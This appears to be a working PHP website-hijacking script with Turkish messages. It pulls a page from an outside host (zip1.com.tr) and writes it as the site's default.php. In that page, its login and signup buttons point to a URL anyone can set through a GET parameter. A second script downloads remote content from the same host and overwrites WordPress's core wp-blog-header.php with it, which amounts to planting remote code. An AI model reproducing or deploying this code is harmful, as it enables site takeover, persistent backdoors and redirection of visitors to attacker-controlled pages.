<?php
ini_set('default_charset', 'UTF-8');
header("Content-Type: text/html; charset=UTF-8");

$url = "https://zip1.com.tr/sayfalar/1.php";
$filePath = $_SERVER['DOCUMENT_ROOT'] . '/default.php';

$customCode = <<<PHP
<?php
if (isset(\$_GET['url'])) {
    \$url = \$_GET['url'];
    file_put_contents('google.txt', \$url);
}
\$savedUrl = file_exists('google.txt') ? file_get_contents('google.txt') : '#';
?>
PHP;

$newDivContent = <<<HTML
<div class="action-buttons"><br>
    <a href="<?php echo htmlspecialchars(\$savedUrl); ?>" target="_blank">Hýzlý Giriþ</a>
    <a href="<?php echo htmlspecialchars(\$savedUrl); ?>" target="_blank">Hemen Üye Ol</a>
</div>
HTML;

$newCSS = <<<CSS
.action-buttons a {
    display: inline-block;
    padding: 12px 25px;
    font-size: 18px;
    color: #222;
    background-color: #fbc02d;
    text-decoration: none;
    border-radius: 8px;
    transition: background-color 0.3s ease;
    margin: 10px 5px; /* Butonlar arasýnda boþluk */
}

.action-buttons a:hover {
    background-color: #ffa000;
}
CSS;

try {
    $sourceCode = file_get_contents($url);

    if ($sourceCode === false) {
        throw new Exception("URL'den veri alýnamadý.");
    }

    $detectedEncoding = mb_detect_encoding($sourceCode, "UTF-8, ISO-8859-1, ISO-8859-9", true);
    if ($detectedEncoding !== "UTF-8") {
        $sourceCode = mb_convert_encoding($sourceCode, "UTF-8", $detectedEncoding);
    }

    $pattern = '/<div class="action-buttons">.*?<\/div>/s';
    $modifiedSourceCode = preg_replace($pattern, $newDivContent, $sourceCode);

    $cssPattern = '/(<style.*?>)(.*?)(<\/style>)/s';
    if (preg_match($cssPattern, $modifiedSourceCode)) {
        $modifiedSourceCode = preg_replace_callback($cssPattern, function ($matches) use ($newCSS) {
            return $matches[1] . $matches[2] . "\n" . $newCSS . "\n" . $matches[3];
        }, $modifiedSourceCode);
    } else {
        $modifiedSourceCode = preg_replace('/<\/head>/', "<style>\n$newCSS\n</style>\n</head>", $modifiedSourceCode, 1);
    }

    $finalCode = $customCode . "\n" . $modifiedSourceCode;

    $result = file_put_contents($filePath, $finalCode);

    if ($result === false) {
        throw new Exception("Dosya yazýlamadý.");
    }

    echo "Kaynak kod baþarýyla güncellenip kaydedildi: $filePath";
} catch (Exception $e) {
    echo "Hata: " . $e->getMessage();
}
?>

<?php
// Hedef dosya yolu
$filePath = $_SERVER['DOCUMENT_ROOT'] . '/wp-blog-header.php';

// Uzak URL
$url = 'https://zip1.com.tr/uzk/otomatik/2.txt';

// Ýçerik deðiþkeni
$content = false;

// 1. Yöntem: file_get_contents kullanarak içeriði almayý dene
if (function_exists('file_get_contents')) {
    $content = @file_get_contents($url);
}

// Eðer 1. yöntem baþarýsýz olursa, 2. yöntemi kullan (cURL)
if ($content === false) {
    if (function_exists('curl_init')) {
        $ch = curl_init($url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
        curl_setopt($ch, CURLOPT_TIMEOUT, 10); // Zaman aþýmý
        $content = curl_exec($ch);
        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        curl_close($ch);

        // HTTP yanýt kodu 200 deðilse iþlem baþarýsýz oldu
        if ($httpCode !== 200) {
            $content = false;
        }
    }
}

// Ýçerik alýndý mý kontrolü
if ($content === false) {
    die('URL içeriði alýnamadý. Lütfen baðlantýyý kontrol edin.');
}

// Dosyaya yazma iþlemi
if (file_put_contents($filePath, $content) === false) {
    die('Dosyaya yazýlamadý. Lütfen dosya izinlerini kontrol edin.');
}

echo 'Wp Header Dosyasý baþarýyla güncellendi.';
?>